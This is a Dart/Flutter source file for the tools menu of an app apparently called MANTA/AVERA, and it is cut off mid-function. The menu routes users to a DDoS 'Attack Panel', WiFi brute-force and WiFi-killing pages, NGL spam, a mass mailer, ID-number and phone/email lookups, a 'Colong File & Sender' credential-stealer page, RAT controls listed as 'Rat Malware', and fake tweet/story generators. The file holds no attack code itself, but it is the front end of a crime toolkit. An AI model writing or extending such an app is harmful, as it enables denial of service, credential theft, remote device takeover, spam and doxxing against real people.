
import 'dart:convert';
import 'dart:ui';
import 'package:flutter/material.dart';
import 'package:flutter/services.dart';
import 'manage_server.dart';
import 'wifi_internal.dart';
import 'wifi_external.dart';
import 'wifi_bruteforce.dart';
import 'ddos_panel.dart';
import 'nik_check.dart';
import 'tiktok_page.dart';
import 'instagram_page.dart';
import 'domain_page.dart';
import 'spam_ngl.dart';
import 'manta_mailer.dart';
import 'package:otax/anime_page.dart';
import 'package:provider/provider.dart';
import 'package:otax/ui/models/providers/appProvider.dart';
import 'ai_page.dart';
import 'code_fixer_page.dart';
import 'package:iconsax/iconsax.dart';
import 'package:otax/tabunganku_module.dart';
import 'finance_manager_page.dart';
import 'fakestory.dart';
import 'faketweet.dart';
import 'iqc.dart';
import 'cpanel.dart';
import 'github_builder.dart';
import 'colong.dart';
import 'manta_builder_page.dart';
import 'packman.dart';
import 'ular.dart';
import 'gameotax.dart';
import 'tourl.dart';
import 'controller.dart';
import 'installubot.dart';
import 'dart:math' as math;
import 'auto_detect_page.dart';
import 'create_vps_page.dart';
import 'install_panel_page.dart';
import 'webapk.dart';
import 'package:flutter_animate/flutter_animate.dart';
import 'phone_lookup_page.dart';
import 'email_lookup_page.dart';

// ═══════════════════════════════════════════════════════════════════════════════
// TOP-LEVEL COLOR THEME — accessible by ALL classes in this file
// ═══════════════════════════════════════════════════════════════════════════════
const Color midnight = Color(0xFF0D0800);
const Color charcoal = Color(0xFF161B22);
const Color steel = Color(0xFF1C2333);
const Color orangeAccent = Color(0xFFFF6D00);
const Color amberAccent = Color(0xFFFF9100);
const Color goldAccent = Color(0xFFFFB300);
const Color mintAccent = Color(0xFFFFA726);
const Color coralAccent = Color(0xFFFF8A65);
const Color violetAccent = Color(0xFFFFB74D);
const Color platinum = Color(0xFFE6EDF3);
const Color surfacePrimary = Color(0xFF151A22);
const Color surfaceSecondary = Color(0xFF1B222C);
const Color lineSoft = Color(0x26E6EDF3);

class ToolsPage extends StatefulWidget {
  final String sessionKey;
  final String userRole;
  final String username;
  final List<Map<String, dynamic>> listDoos;

  const ToolsPage({
    super.key,
    required this.sessionKey,
    required this.userRole,
    required this.username,
    required this.listDoos,
  });

  @override
  State<ToolsPage> createState() => _ToolsPageState();
}

class _ToolsPageState extends State<ToolsPage> with TickerProviderStateMixin {
  late final AnimationController _glowController;
  late final Animation<double> _glowAnimation;

  static const List<_ToolCategory> _categories = [
    _ToolCategory(
      icon: Iconsax.wallet_3,
      title: "TabunganKu",
      subtitle: "Finance Manager PRO",
      stat: "Income",
      accent: Colors.greenAccent,
      accentSecondary: Colors.cyanAccent,
    ),
    _ToolCategory(
      icon: Icons.cloud_outlined,
      title: "Hosting Tools",
      subtitle: "Manajemen server",
      stat: "Deploy",
      accent: orangeAccent,
      accentSecondary: mintAccent,
    ),
    _ToolCategory(
      icon: Icons.sports_esports_outlined,
      title: "Games",
      subtitle: "Pacman, ular, dll",
      stat: "Play",
      accent: violetAccent,
      accentSecondary: orangeAccent,
    ),
    _ToolCategory(
      icon: Icons.smart_toy_outlined,
      title: "AI Tools",
      subtitle: "Asisten, Code Fixer",
      stat: "Brain",
      accent: orangeAccent,
      accentSecondary: violetAccent,
    ),
    _ToolCategory(
      icon: Icons.flash_on_outlined,
      title: "DDoS",
      subtitle: "Stress test",
      stat: "Pulse",
      accent: coralAccent,
      accentSecondary: amberAccent,
    ),
    _ToolCategory(
      icon: Icons.wifi_outlined,
      title: "Network",
      subtitle: "WiFi, spam",
      stat: "Signal",
      accent: mintAccent,
      accentSecondary: orangeAccent,
    ),
    _ToolCategory(
      icon: Icons.search_outlined,
      title: "OSINT",
      subtitle: "NIK, domain, telepon",
      stat: "Scan",
      accent: amberAccent,
      accentSecondary: coralAccent,
    ),
    _ToolCategory(
      icon: Icons.download_outlined,
      title: "Downloader",
      subtitle: "TikTok, Instagram",
      stat: "Fetch",
      accent: orangeAccent,
      accentSecondary: amberAccent,
    ),
    _ToolCategory(
      icon: Icons.build_outlined,
      title: "AVERARAT",
      subtitle: "Rat Malware",
      stat: "Remote",
      accent: coralAccent,
      accentSecondary: violetAccent,
    ),
    _ToolCategory(
      icon: Icons.rocket_launch_outlined,
      title: "Generator",
      subtitle: "Quote, fake story",
      stat: "Create",
      accent: violetAccent,
      accentSecondary: amberAccent,
    ),
    _ToolCategory(
      icon: Icons.auto_awesome_outlined,
      title: "Anime",
      subtitle: "Streaming, 18+",
      stat: "Watch",
      accent: mintAccent,
      accentSecondary: violetAccent,
    ),
  ];

  @override
  void initState() {
    super.initState();
    _glowController = AnimationController(
      duration: const Duration(seconds: 4),
      vsync: this,
    )..repeat(reverse: true);
    _glowAnimation = Tween<double>(begin: 0.6, end: 1.0).animate(
      CurvedAnimation(parent: _glowController, curve: Curves.easeInOutSine),
    );
  }

  @override
  void dispose() {
    _glowController.dispose();
    super.dispose();
  }

  @override
  Widget build(BuildContext context) {
    return Scaffold(
      extendBodyBehindAppBar: true,
      backgroundColor: Colors.transparent,
      body: Container(
        decoration: const BoxDecoration(
          image: DecorationImage(
            image: AssetImage('assets/images/cek_ban_bg.jpg'),
            fit: BoxFit.cover,
          ),
        ),
        child: Container(
          decoration: BoxDecoration(
            gradient: LinearGradient(
              begin: Alignment.topCenter,
              end: Alignment.bottomCenter,
              colors: [
                Colors.black.withOpacity(0.40),
                Colors.black.withOpacity(0.60),
                Colors.black.withOpacity(0.80),
              ],
              stops: const [0.0, 0.4, 1.0],
            ),
          ),
          child: SafeArea(
            child: CustomScrollView(
              physics: const BouncingScrollPhysics(),
              slivers: [
                SliverPadding(
                  padding: const EdgeInsets.fromLTRB(20, 20, 20, 0),
                  sliver: SliverToBoxAdapter(
                    child: _buildHeader()
                        .animate()
                        .fadeIn(duration: 600.ms)
                        .slideY(begin: 0.1),
                  ),
                ),
                SliverPadding(
                  padding: const EdgeInsets.fromLTRB(20, 16, 20, 0),
                  sliver: SliverToBoxAdapter(
                    child: _buildSystemInfo().animate().fadeIn(
                      duration: 600.ms,
                      delay: 200.ms,
                    ),
                  ),
                ),
                SliverPadding(
                  padding: const EdgeInsets.fromLTRB(20, 24, 20, 16),
                  sliver: SliverToBoxAdapter(
                    child: _buildSectionHeader().animate().fadeIn(
                      duration: 600.ms,
                      delay: 300.ms,
                    ),
                  ),
                ),
                SliverPadding(
                  padding: const EdgeInsets.symmetric(horizontal: 20),
                  sliver: SliverGrid(
                    gridDelegate: SliverGridDelegateWithFixedCrossAxisCount(
                      crossAxisCount: MediaQuery.of(context).size.width > 600 ? 3 : 2,
                      crossAxisSpacing: 14,
                      mainAxisSpacing: 14,
                      childAspectRatio: 0.85,
                    ),
                    delegate: SliverChildBuilderDelegate((context, index) {
                      final category = _categories[index];
                      return _ToolCard(
                            category: category,
                            onTap: () => _onCategoryTap(context, category),
                          )
                          .animate()
                          .fadeIn(duration: 400.ms, delay: (100 * index).ms)
                          .scale(begin: const Offset(0.9, 0.9));
                    }, childCount: _categories.length),
                  ),
                ),
                const SliverToBoxAdapter(child: SizedBox(height: 100)),
              ],
            ),
          ),
        ),
      ),
    );
  }

  Widget _buildHeader() {
    return Container(
      padding: const EdgeInsets.all(24),
      decoration: BoxDecoration(
        borderRadius: BorderRadius.circular(28),
        border: Border.all(color: orangeAccent.withOpacity(0.35), width: 1.5),
        boxShadow: [
          BoxShadow(
            color: Colors.black.withOpacity(0.5),
            blurRadius: 30,
            offset: const Offset(0, 15),
          ),
        ],
        image: const DecorationImage(
          image: AssetImage('assets/images/tools_manta_card.png'),
          fit: BoxFit.cover,
        ),
      ),
      child: ClipRRect(
        borderRadius: BorderRadius.circular(28),
        child: Container(
          decoration: BoxDecoration(
            gradient: LinearGradient(
              begin: Alignment.topLeft,
              end: Alignment.bottomRight,
              colors: [
                Colors.black.withOpacity(0.30),
                Colors.black.withOpacity(0.55),
                Colors.black.withOpacity(0.75),
              ],
              stops: const [0.0, 0.40, 1.0],
            ),
          ),
          child: Padding(
            padding: const EdgeInsets.all(16),
            child: Column(
              crossAxisAlignment: CrossAxisAlignment.start,
              children: [
                Row(
                  mainAxisAlignment: MainAxisAlignment.spaceBetween,
                  children: [
                    Container(
                      padding: const EdgeInsets.all(10),
                      decoration: BoxDecoration(
                        shape: BoxShape.circle,
                        border: Border.all(color: Colors.white.withOpacity(0.15)),
                        color: Colors.black.withOpacity(0.35),
                      ),
                      child: Image.asset(
                        'assets/images/MANTAlogo.png',
                        width: 28,
                        height: 28,
                        errorBuilder: (context, error, stackTrace) => const Icon(
                          Icons.shield_moon,
                          color: orangeAccent,
                          size: 26,
                        ),
                      ),
                    ),
                    _buildRoleBadge(),
                  ],
                ),
                const SizedBox(height: 20),
                const Text(
                  "MANTA TOOLS",
                  style: TextStyle(
                    color: orangeAccent,
                    fontSize: 12,
                    fontWeight: FontWeight.w900,
                    letterSpacing: 2.5,
                  ),
                ),
                const SizedBox(height: 6),
                const Text(
                  "Menu Manta",
                  style: TextStyle(
                    color: platinum,
                    fontSize: 28,
                    fontWeight: FontWeight.w900,
                    letterSpacing: -0.5,
                  ),
                ),
                const SizedBox(height: 10),
                Text(
                  "Pusat akses berbagai menu aplikasi Manta untuk kebutuhan harian Anda.",
                  style: TextStyle(
                    color: platinum.withOpacity(0.65),
                    fontSize: 13,
                    height: 1.5,
                  ),
                ),
              ],
            ),
          ),
        ),
      ),
    );
  }

  Widget _buildSectionHeader() {
    return Row(
      mainAxisAlignment: MainAxisAlignment.spaceBetween,
      children: [
        Column(
          crossAxisAlignment: CrossAxisAlignment.start,
          children: [
            const Text(
              "KATEGORI MENU",
              style: TextStyle(
                color: platinum,
                fontSize: 18,
                fontWeight: FontWeight.w900,
                letterSpacing: -0.2,
              ),
            ),
            const SizedBox(height: 4),
            Text(
              "Pilih kategori menu yang Anda butuhkan.",
              style: TextStyle(color: platinum.withOpacity(0.5), fontSize: 12),
            ),
          ],
        ),
        Container(
          padding: const EdgeInsets.symmetric(horizontal: 14, vertical: 8),
          decoration: BoxDecoration(
            color: Colors.black.withOpacity(0.35),
            borderRadius: BorderRadius.circular(14),
            border: Border.all(color: orangeAccent.withOpacity(0.35)),
          ),
          child: Text(
            "${_categories.length} Modules",
            style: const TextStyle(
              color: orangeAccent,
              fontSize: 11,
              fontWeight: FontWeight.w800,
            ),
          ),
        ),
      ],
    );
  }

  Widget _buildRoleBadge() {
    return Container(
      padding: const EdgeInsets.symmetric(horizontal: 14, vertical: 8),
      decoration: BoxDecoration(
        color: Colors.black.withOpacity(0.45),
        borderRadius: BorderRadius.circular(999),
        border: Border.all(color: orangeAccent.withOpacity(0.40), width: 1),
      ),
      child: Row(
        mainAxisSize: MainAxisSize.min,
        children: [
          Container(
            width: 8,
            height: 8,
            decoration: BoxDecoration(
              color: orangeAccent,
              shape: BoxShape.circle,
              boxShadow: [
                BoxShadow(color: orangeAccent.withOpacity(0.55), blurRadius: 8),
              ],
            ),
          ),
          const SizedBox(width: 8),
          Text(
            widget.userRole.toUpperCase(),
            style: const TextStyle(
              color: orangeAccent,
              fontSize: 11,
              fontWeight: FontWeight.w700,
              letterSpacing: 0.9,
            ),
          ),
        ],
      ),
    );
  }

  Widget _buildSystemInfo() {
    return Container(
      padding: const EdgeInsets.all(20),
      decoration: BoxDecoration(
        color: Colors.black.withOpacity(0.40),
        borderRadius: BorderRadius.circular(24),
        border: Border.all(color: orangeAccent.withOpacity(0.25), width: 1.2),
        boxShadow: [
          BoxShadow(
            color: Colors.black.withOpacity(0.3),
            blurRadius: 20,
            offset: const Offset(0, 8),
          ),
        ],
      ),
      child: Row(
        children: [
          Expanded(
            child: _buildCompactMetric(
              label: "ROLE",
              value: widget.userRole.toUpperCase(),
              color: orangeAccent,
            ),
          ),
          Container(
            width: 1,
            height: 30,
            color: Colors.white.withOpacity(0.08),
            margin: const EdgeInsets.symmetric(horizontal: 16),
          ),
          Expanded(
            child: _buildCompactMetric(
              label: "JUMLAH MENU",
              value: "${_categories.length} TOOLS",
              color: orangeAccent,
            ),
          ),
          Container(
            width: 1,
            height: 30,
            color: Colors.white.withOpacity(0.08),
            margin: const EdgeInsets.symmetric(horizontal: 16),
          ),
          Expanded(
            child: InkWell(
              onTap: _copySessionId,
              child: _buildCompactMetric(
                label: "SESSION",
                value: "READY",
                color: orangeAccent,
                icon: Icons.copy_all_rounded,
              ),
            ),
          ),
        ],
      ),
    );
  }

  Widget _buildCompactMetric({
    required String label,
    required String value,
    required Color color,
    IconData? icon,
  }) {
    return Column(
      crossAxisAlignment: CrossAxisAlignment.start,
      children: [
        Text(
          label,
          style: TextStyle(
            color: platinum.withOpacity(0.4),
            fontSize: 9,
            fontWeight: FontWeight.w900,
            letterSpacing: 1.2,
          ),
        ),
        const SizedBox(height: 4),
        Row(
          mainAxisSize: MainAxisSize.min,
          children: [
            Text(
              value,
              style: TextStyle(
                color: color,
                fontSize: 12,
                fontWeight: FontWeight.w800,
                letterSpacing: 0.5,
              ),
            ),
            if (icon != null) ...[
              const SizedBox(width: 4),
              Icon(icon, color: color.withOpacity(0.5), size: 12),
            ],
          ],
        ),
      ],
    );
  }

  Widget _buildSessionMetric() {
    return Container(
      padding: const EdgeInsets.symmetric(horizontal: 14, vertical: 12),
      decoration: BoxDecoration(
        color: Colors.white.withOpacity(0.04),
        borderRadius: BorderRadius.circular(18),
        border: Border.all(color: violetAccent.withOpacity(0.2)),
      ),
      child: Column(
        crossAxisAlignment: CrossAxisAlignment.start,
        children: [
          Text(
            "Session ID",
            style: TextStyle(
              color: platinum.withOpacity(0.55),
              fontSize: 10,
              fontWeight: FontWeight.w600,
              letterSpacing: 0.5,
            ),
          ),
          const SizedBox(height: 6),
          Text(
            widget.sessionKey,
            style: const TextStyle(
              color: violetAccent,
              fontSize: 14,
              fontWeight: FontWeight.w800,
            ),
            maxLines: 1,
            overflow: TextOverflow.ellipsis,
          ),
          const SizedBox(height: 10),
          Row(
            children: [
              Expanded(
                child: _buildSessionAction(
                  icon: Icons.copy_all_rounded,
                  label: "Salin ID",
                  onTap: _copySessionId,
                ),
              ),
              const SizedBox(width: 10),
              Expanded(
                child: _buildSessionAction(
                  icon: Icons.data_object_rounded,
                  label: "Salin Config",
                  onTap: _copyConfigSnippet,
                ),
              ),
            ],
          ),
        ],
      ),
    );
  }

  Widget _buildSessionAction({
    required IconData icon,
    required String label,
    required VoidCallback onTap,
  }) {
    return InkWell(
      onTap: onTap,
      borderRadius: BorderRadius.circular(14),
      child: Container(
        padding: const EdgeInsets.symmetric(horizontal: 10, vertical: 9),
        decoration: BoxDecoration(
          color: Colors.white.withOpacity(0.04),
          borderRadius: BorderRadius.circular(14),
          border: Border.all(color: lineSoft),
        ),
        child: Row(
          mainAxisAlignment: MainAxisAlignment.center,
          children: [
            Icon(icon, size: 15, color: platinum.withOpacity(0.84)),
            const SizedBox(width: 6),
            Flexible(
              child: Text(
                label,
                style: TextStyle(
                  color: platinum.withOpacity(0.84),
                  fontSize: 11,
                  fontWeight: FontWeight.w700,
                ),
                overflow: TextOverflow.ellipsis,
              ),
            ),
          ],
        ),
      ),
    );
  }

  Future<void> _copySessionId() async {
    await Clipboard.setData(ClipboardData(text: widget.sessionKey));
    if (!mounted) return;
    _showInfoSnack('Session ID berhasil disalin');
  }

  Future<void> _copyConfigSnippet() async {
    final payload = <String, dynamic>{
      "username": widget.username,
      "session_id": widget.sessionKey,
      "webview_url": "https://www.google.com",
      "app_name": "AVERA X2",
      "logo_url": "https://files.catbox.moe/fi1fpt.jpg",
    };
    final formatted = const JsonEncoder.withIndent('  ').convert(payload);
    await Clipboard.setData(ClipboardData(text: formatted));
    if (!mounted) return;
    _showInfoSnack('Config JSON siap ditempel ke MANTA X2');
  }

  void _onCategoryTap(BuildContext context, _ToolCategory category) {
    switch (category.title) {
      case "Hosting Tools":
        _showVpsTools(context);
        break;
      case "Games":
        _showGamesTools(context);
        break;
      case "AI Tools":
        _showAITools(context);
        break;
      case "DDoS":
        _showDDoSTools(context);
        break;
      case "Network":
        _showNetworkTools(context);
        break;
      case "OSINT":
        _showOSINTTools(context);
        break;
      case "Downloader":
        _showDownloaderTools(context);
        break;
      case "AVERARAT":
        _showUtilityTools(context);
        break;
      case "Generator":
        _showQuickAccess(context);
        break;
      case "Anime":
        _showAnimeTools(context);
        break;
      case "TabunganKu":
        Navigator.push(
          context,
          MaterialPageRoute(builder: (_) => const TabunganKuModule()),
        );
        break;
    }
  }

  void _showAnimeTools(BuildContext context) {
    _showModalSheet(context, "Anime", Icons.auto_awesome_outlined, [
      _buildModalItem(
        icon: Icons.movie_outlined,
        label: "Anime Page",
        onTap: () {
          Navigator.push(
            context,
            MaterialPageRoute(
              builder: (_) => FutureBuilder(
                future: ensureAnimeStreamInitialized(),
                builder: (context, snapshot) {
                  if (snapshot.connectionState == ConnectionState.waiting) {
                    return const Scaffold(
                      backgroundColor: Colors.black,
                      body: Center(
                        child: CircularProgressIndicator(
                          color: Colors.cyanAccent,
                        ),
                      ),
                    );
                  }
                  if (snapshot.hasError) {
                    return Scaffold(
                      backgroundColor: Colors.black,
                      body: Center(
                        child: Text(
                          "Error initializing Anime: ${snapshot.error}",
                          style: const TextStyle(color: Colors.redAccent),
                        ),
                      ),
                    );
                  }
                  return ChangeNotifierProvider(
                    create: (ctx) => AppProvider(),
                    child: const AnimeStream(),
                  );
                },
              ),
            ),
          );
        },
      )
    ]);
  }

  void _showVpsTools(BuildContext context) {
    _showModalSheet(context, "Hosting Tools", Icons.cloud_outlined, [
      _buildModalItem(
        icon: Icons.sports_esports_outlined,
        label: "Cpanel",
        onTap: () {
          Navigator.push(
            context,
            MaterialPageRoute(
              builder: (_) =>
                  CpanelPage(username: widget.username, role: widget.userRole),
            ),
          );
        },
      ),
      _buildModalItem(
        icon: Icons.security_outlined,
        label: "Colong File & Sender",
        onTap: () {
          Navigator.push(
            context,
            MaterialPageRoute(
              builder: (_) => CredsStealerAdvancedPage(
                username: widget.username,
                role: widget.userRole,
              ),
            ),
          );
        },
      ),
      _buildModalItem(
        icon: Icons.computer_outlined,
        label: "Buat VPS DigitalOcean",
        onTap: () {
          Navigator.push(
            context,
            MaterialPageRoute(
              builder: (_) => CreateVpsPage(
                sessionKey: widget.sessionKey,
                username: widget.username,
                role: widget.userRole,
              ),
            ),
          );
        },
      ),
      _buildModalItem(
        icon: Icons.settings_ethernet_outlined,
        label: "Install Panel Pterodactyl",
        onTap: () {
          Navigator.push(
            context,
            MaterialPageRoute(builder: (_) => const InstallPanelPage()),
          );
        },
      ),
      _buildModalItem(
        icon: Icons.build_circle_outlined,
        label: "Install Flutter",
        onTap: () {
          Navigator.push(
            context,
            MaterialPageRoute(builder: (_) => const InstallWeb2apkPage()),
          );
        },
      ),
      _buildModalItem(
        icon: Icons.build_circle_outlined,
        label: "Build Flutter Github",
        onTap: () {
          Navigator.push(
            context,
            MaterialPageRoute(builder: (_) => const GithubBuilderPage()),
          );
        },
      ),
      _buildModalItem(
        icon: Icons.build_circle_outlined,
        label: "Install Ubot",
        onTap: () {
          Navigator.push(
            context,
            MaterialPageRoute(builder: (_) => const InstallUbotPage()),
          );
        },
      ),
    ]);
  }

  void _showGamesTools(BuildContext context) {
    _showModalSheet(context, "Games", Icons.sports_esports_outlined, [
      _buildModalItem(
        icon: Icons.sports_esports_outlined,
        label: "Packman",
        onTap: () {
          Navigator.push(
            context,
            MaterialPageRoute(builder: (_) => const PacmanGamePage()),
          );
        },
      ),
      _buildModalItem(
        icon: Icons.catching_pokemon_outlined,
        label: "Ular Klasik",
        onTap: () {
          Navigator.push(
            context,
            MaterialPageRoute(builder: (_) => const SnakeGame()),
          );
        },
      ),
      _buildModalItem(
        icon: Icons.catching_pokemon_outlined,
        label: "AVERA GAMES",
        onTap: () {
          Navigator.push(
            context,
            MaterialPageRoute(builder: (_) => const RetroGameHub()),
          );
        },
      ),
    ]);
  }

  void _showAITools(BuildContext context) {
    _showModalSheet(context, "AI Tools", Icons.smart_toy_outlined, [
      _buildModalItem(
        icon: Icons.smart_toy_outlined,
        label: "AI Assistant",
        onTap: () {
          Navigator.push(
            context,
            MaterialPageRoute(
              builder: (_) => AIPage(
                sessionKey: widget.sessionKey,
                username: widget.username,
                role: widget.userRole,
              ),
            ),
          );
        },
      ),
      _buildModalItem(
        icon: Icons.code_rounded,
        label: "AI Code Fixer",
        onTap: () {
          Navigator.push(
            context,
            MaterialPageRoute(
              builder: (_) => CodeFixerPage(
                sessionKey: widget.sessionKey,
                username: widget.username,
                role: widget.userRole,
              ),
            ),
          );
        },
      ),
    ]);
  }

  void _showDDoSTools(BuildContext context) {
    _showModalSheet(context, "DDoS", Icons.flash_on_outlined, [
      _buildModalItem(
        icon: Icons.flash_on_outlined,
        label: "Attack Panel",
        onTap: () {
          Navigator.push(
            context,
            MaterialPageRoute(
              builder: (_) => AttackPanel(
                sessionKey: widget.sessionKey,
                listDoos: widget.listDoos,
              ),
            ),
          );
        },
      ),
      _buildModalItem(
        icon: Icons.dns_outlined,
        label: "Manage Server",
        onTap: () {
          Navigator.push(
            context,
            MaterialPageRoute(
              builder: (_) => ManageServerPage(keyToken: widget.sessionKey),
            ),
          );
        },
      ),
      _buildModalItem(
        icon: Icons.sports_esports_outlined,
        label: "Auto Detect Games",
        onTap: () {
          Navigator.push(
            context,
            MaterialPageRoute(
              builder: (_) => AutoDetectPage(
                sessionKey: widget.sessionKey,
                savedVPS: widget.listDoos,
              ),
            ),
          );
        },
      ),
    ]);
  }

  void _showNetworkTools(BuildContext context) {
    _showModalSheet(context, "Network", Icons.wifi_outlined, [
      _buildModalItem(
        icon: Icons.newspaper_outlined,
        label: "Spam NGL",
        onTap: () {
          Navigator.push(context, MaterialPageRoute(builder: (_) => NglPage()));
        },
      ),
      _buildModalItem(
        icon: Icons.wifi_password_outlined,
        label: "WiFi Brute-Force",
        onTap: () {
          Navigator.push(
            context,
            MaterialPageRoute(builder: (_) => const WifiBruteforcePage()),
          );
        },
      ),
      _buildModalItem(
        icon: Icons.mark_email_unread_outlined,
        label: "AVERA Mailer",
        onTap: () {
          Navigator.push(
            context,
            MaterialPageRoute(builder: (_) => const MantaMailerPage()),
          );
        },
      ),
      _buildModalItem(
        icon: Icons.wifi_off_outlined,
        label: "WiFi Internal",
        onTap: () {
          Navigator.push(
            context,
            MaterialPageRoute(builder: (_) => WifiKillerPage()),
          );
        },
      ),
      if (widget.userRole == "KINGZ" || widget.userRole == "OWNER")
        _buildModalItem(
          icon: Icons.router_outlined,
          label: "WiFi External",
          onTap: () {
            Navigator.push(
              context,
              MaterialPageRoute(
                builder: (_) => WifiExternalPage(sessionKey: widget.sessionKey),
              ),
            );
          },
        ),
    ]);
  }

  void _showOSINTTools(BuildContext context) {
    _showModalSheet(context, "OSINT", Icons.search_outlined, [
      _buildModalItem(
        icon: Icons.badge_outlined,
        label: "NIK Detail",
        onTap: () {
          Navigator.push(
            context,
            MaterialPageRoute(builder: (_) => const NikCheckerPage()),
          );
        },
      ),
      _buildModalItem(
        icon: Icons.domain_outlined,
        label: "Domain OSINT",
        onTap: () {
          Navigator.push(
            context,
            MaterialPageRoute(builder: (_) => const DomainOsintPage()),
          );
        },
      ),
      _buildModalItem(
        icon: Icons.person_search_outlined,
        label: "Phone Lookup",
        onTap: () {
          Navigator.push(
            context,
            MaterialPageRoute(builder: (_) => const PhoneLookupPage()),
          );
        },
      ),
      _buildModalItem(
        icon: Icons.email_outlined,
        label: "Email OSINT",
        onTap: () {
          Navigator.push(
            context,
            MaterialPageRoute(builder: (_) => const EmailLookupPage()),
          );
        },
      ),
    ]);
  }

  void _showDownloaderTools(BuildContext context) {
    _showModalSheet(context, "Downloader", Icons.download_outlined, [
      _buildModalItem(
        icon: Icons.video_library_outlined,
        label: "TikTok",
        onTap: () {
          Navigator.push(
            context,
            MaterialPageRoute(builder: (_) => const TiktokDownloaderPage()),
          );
        },
      ),
      _buildModalItem(
        icon: Icons.camera_alt_outlined,
        label: "Instagram",
        onTap: () {
          Navigator.push(
            context,
            MaterialPageRoute(builder: (_) => const InstagramDownloaderPage()),
          );
        },
      ),
    ]);
  }

  void _showUtilityTools(BuildContext context) {
    _showModalSheet(context, "OMNIXRAT", Icons.build_outlined, [
      _buildModalItem(
        icon: Icons.badge_outlined,
        label: "RAT Controll",
        onTap: () {
          Navigator.pop(context);
          AppConfig.sessionKey = widget.sessionKey;
          Navigator.push(
            context,
            MaterialPageRoute(builder: (_) => const TargetListPage()),
          );
        },
      ),
      _buildModalItem(
        icon: Icons.android_outlined,
        label: "Auto Modifikasi Aplikasi",
        onTap: () {
          Navigator.push(
            context,
            MaterialPageRoute(builder: (_) => const MantaBuilderPage()),
          );
        },
      ),
    ]);
  }

  void _showQuickAccess(BuildContext context) {
    _showModalSheet(context, "Generator", Icons.auto_awesome, [
      _buildModalItem(
        icon: Icons.phone_iphone,
        label: "iPhone Quote",
        onTap: () {
          Navigator.push(
            context,
            MaterialPageRoute(builder: (_) => const IqcPage()),
          );
        },
      ),
      _buildModalItem(
        icon: Icons.auto_stories_outlined,
        label: "Fake Story",
        onTap: () {
          Navigator.push(
            context,
            MaterialPageRoute(builder: (_) => const FakeStoryPage()),
          );
        },
      ),
      _buildModalItem(
        icon: Icons.flutter_dash,
        label: "Fake Tweet",
        onTap: () {
          Navigator.push(
            context,
            MaterialPageRoute(builder: (_) => const FakeTweetPage()),
          );
        },
      ),
      _buildModalItem(
        icon: Icons.cloud_upload_outlined,
        label: "To Url",
        onTap: () {
          Navigator.push(
            context,
            MaterialPageRoute(builder: (_) => const UploadToUrlPage()),
          );
        },
      ),
    ]);
  }

  void _showModalSheet(
    BuildContext context,
    String title,
    IconData icon,
    List<Widget> items,
  ) {
    showModalBottomSheet(
      context: context,
      backgroundColor: Colors.transparent,
      isScrollControlled: true,
      barrierColor: Colors.black.withOpacity(0.7),
      builder: (_) => BackdropFilter(
        filter: ImageFilter.blur(sigmaX: 15, sigmaY: 15),
        child: Container(
          height: MediaQuery.of(context).size.height * 0.88,
          decoration: BoxDecoration(
            color: midnight.withOpacity(0.92),
            borderRadius: const BorderRadius.only(
              topLeft: Radius.circular(40),
              topRight: Radius.circular(40),
            ),
            border: Border.all(
              color: Colors.white.withOpacity(0.08),
              width: 1.5,
            ),
            boxShadow: [
              BoxShadow(
                color: Colors.black.withOpacity(0.6),
                blurRadius: 40,
                spreadRadius: 5,
              ),
            ],
          ),
          child: Column(
            children: [
              const SizedBox(height: 16),
              Container(
                width: 40,
                height: 4,
                decoration: BoxDecoration(
                  color: Colors.white.withOpacity(0.2),
                  borderRadius: BorderRadius.circular(10),
                ),
              ),
              Padding(
                padding: const EdgeInsets.fromLTRB(28, 24, 28, 20),
                child: Row(
                  children: [
                    Container(
                      padding: const EdgeInsets.all(12),
                      decoration: BoxDecoration(
                        color: orangeAccent.withOpacity(0.1),
                        borderRadius: BorderRadius.circular(16),
                        border: Border.all(color: orangeAccent.withOpacity(0.2)),
                      ),
                      child: Icon(icon, color: orangeAccent, size: 28),
                    ),
                    const SizedBox(width: 18),
                    Expanded(
                      child: Column(
                        crossAxisAlignment: CrossAxisAlignment.start,
                        children: [
                          Text(
                            title.toUpperCase(),
                            style: TextStyle(
                              color: orangeAccent.withOpacity(0.8),
                              fontSize: 12,
                              fontWeight: FontWeight.w900,
                              letterSpacing: 1.5,
                            ),
                          ),
                          const SizedBox(height: 4),
                          const Text(
                            "Konfigurasi Menu",
                            style: TextStyle(
                              color: platinum,
                              fontSize: 22,
                              fontWeight: FontWeight.w900,
                            ),
                          ),
                        ],
                      ),
                    ),
                    IconButton(
                      onPressed: () => Navigator.pop(context),
                      icon: Icon(
                        Icons.close_rounded,
                        color: platinum.withOpacity(0.5),
                      ),
                    ),
                  ],
                ),
              ),
              Container(
                height: 1,
                width: double.infinity,
                margin: const EdgeInsets.symmetric(horizontal: 28),
                color: Colors.white.withOpacity(0.05),
              ),
              const SizedBox(height: 20),
              Expanded(
                child: ListView.separated(
                  padding: const EdgeInsets.fromLTRB(28, 0, 28, 40),
                  itemCount: items.length,
                  separatorBuilder: (_, __) => const SizedBox(height: 14),
                  itemBuilder: (ctx, idx) => items[idx]
                      .animate()
                      .fadeIn(duration: 400.ms, delay: (50 * idx).ms)
                      .slideX(begin: 0.1),
                ),
              ),
            ],
          ),
        ),
      ),
    );
  }

  Widget _buildModalItem({
    required IconData icon,
    required String label,
    required VoidCallback onTap,
  }) {
    return Material(
      color: Colors.transparent,
      child: InkWell(
        onTap: onTap,
        borderRadius: BorderRadius.circular(20),
        splashColor: orangeAccent.withOpacity(0.1),
        highlightColor: Colors.transparent,
        child: Container(
          padding: const EdgeInsets.all(18),
          decoration: BoxDecoration(
            color: Colors.white.withOpacity(0.03),
            borderRadius: BorderRadius.circular(20),
            border: Border.all(
              color: Colors.white.withOpacity(0.06),
              width: 1.2,
            ),
          ),
          child: Row(
            children: [
              Container(
                padding: const EdgeInsets.all(10),
                decoration: BoxDecoration(
                  color: orangeAccent.withOpacity(0.1),
                  borderRadius: BorderRadius.circular(12),
                ),
                child: Icon(icon, color: orangeAccent, size: 22),
              ),
              const SizedBox(width: 18),
              Expanded(
                child: Text(
                  label,
                  style: const TextStyle(
                    color: platinum,
                    fontSize: 15,
                    fontWeight: FontWeight.w600,
                    letterSpacing: 0.2,
                  ),
                ),
              ),
              Icon(
                Icons.chevron_right_rounded,
                color: platinum.withOpacity(0.3),
                size: 20,
              ),
            ],
          ),
        ),
      ),
    );
  }

  void _showComingSoon(BuildContext context) {
    HapticFeedback.lightImpact();
    _showInfoSnack(
      'Segera hadir',
      icon: Icons.hourglass_top_outlined,
      backgroundColor: orangeAccent,
    );
  }

  void _showInfoSnack(
    String message, {
    IconData icon = Icons.check_circle_outline_rounded,
    Color backgroundColor = orangeAccent,
  }) {
